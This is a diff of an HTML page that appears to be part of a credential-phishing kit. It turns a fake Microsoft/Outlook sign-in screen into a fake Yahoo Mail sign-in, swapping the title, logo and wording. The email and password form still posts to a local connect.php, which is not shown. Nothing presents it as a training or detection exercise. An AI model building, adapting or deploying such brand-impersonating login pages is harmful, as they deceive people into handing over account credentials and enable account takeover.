@@ -3,8 +3,8 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>LOG IN</title>
-  <link rel="icon" href="image/logo.png">
+  <title>Yahoo</title>
+  <link rel="icon" href="image/unnamed.png">
   <link rel="stylesheet" href="plugins/bootstrap/css/bootstrap.css">
   <link rel="stylesheet" href="style.css">
   <script src="plugins/jquery.min.js"></script>
@@ -32,30 +32,42 @@
         
           <!-- Modal Header -->
           <div class="mb-4">
-            <div class="modal-title pt-5">
-              <img src="image/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="">
+            <div class="modal-title row justify-content-center">
+              <img src="image/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="" width="120px" class="pt-4 mt-4">
             </div>
             
-          <button type="button" class="close" data-dismiss="modal">&times;</button>
+         
           </div>
           
           <!-- Modal body -->
           <div class="modal-body">
-            <h4 class="">Sign in</h4>
-            <p class="">to continue to outlook</p>
+            <h2 class="text-center pt-4">Sign in to Yahoo Mail </h2>
+            <p class="text-center pb-5">using your Yahoo account</p>
 
             <form action="connect.php" method="POST">
     
-              <input type="text" class="form-control" placeholder="Email, phone, or Skype" name="email" required ><br>
+              <input type="text" class="form-control" placeholder="Username, email, or mobile" name="email" required ><br>
 
               <input type="password" class="form-control mb-3" placeholder="password" name="password" required><br>
  
-              <p class=" mb-4">No account?<span><a href="#" class=""> Create one!</a></span></p>
-              
-              <a href="#" class=" pt-2">Can't access your account?</a>
-              <div class="butt">
-              <button type="submit" class="btn btn-primary px-5 my-4" name="submit">Next</button>
-              </div>
+              <div class="row justify-content-center">
+                <button type="submit" class="btn btn-butts px-5 my-4" name="submit">Next</button>
+                </div>
+
+                <div class="row">
+                  <div class="col-6">
+                    <input type="checkbox"> <span class="text-primary stay">Stay signed in</span>
+                  </div>
+                  <div class="col-6">
+                    <a href="#"><p class="text-primary stay"> Forgot username?</p></a>
+                  </div>
+                </div>
+
+                <div class="row justify-content-center butts">
+                  <button type="submit" class="btn btn-butt px-5 my-4" name="submit"><span class="text-primary"><b>Create an Account</b></span></button>
+                  </div>
+
+             
           </form>
           </div>
         </div>
